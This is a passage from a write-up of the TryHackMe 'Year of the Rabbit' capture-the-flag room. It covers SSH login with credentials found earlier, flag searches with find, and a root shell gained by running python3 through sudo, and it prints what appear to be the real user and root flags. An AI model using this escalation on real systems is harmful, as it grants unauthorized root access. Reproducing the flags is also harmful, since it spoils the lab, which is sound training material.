8. SSH Login
Use the discovered credentials to log in via SSH.
ssh user@10.10.xx.xx
After logging in, search for the user flag.
find / -name user.txt 2>/dev/null
Example flag:
THM{user_flag_here}
THM{1107174691af9ff3681d2b5bdb5740b1589bae53}

---

9. Privilege Escalation
Next, check sudo permissions.
sudo -l
Sometimes a script or binary can be executed as root.
If a writable script is found, edit it and spawn a shell.
Example:
sudo /usr/bin/python3
Spawn root shell:
import os
os.system("/bin/bash")
Now verify:
whoami
Output:
root

---

10. Capture Root Flag
Search for the root flag.
find / -name root.txt 2>/dev/null
Example:
THM{root_flag_here}
THM{8d6f163a87a1c80de27a4fd61aef0f3a0ecf9161}

---

Conclusion
In this room we learned several important penetration testing techniques:
Web enumeration
Directory brute forcing
Decoding hidden credentials
Service exploitation
Privilege escalation

The Year of the Rabbit challenge is a great beginner-to-intermediate room that teaches how small clues on a website can lead to full system compromise.

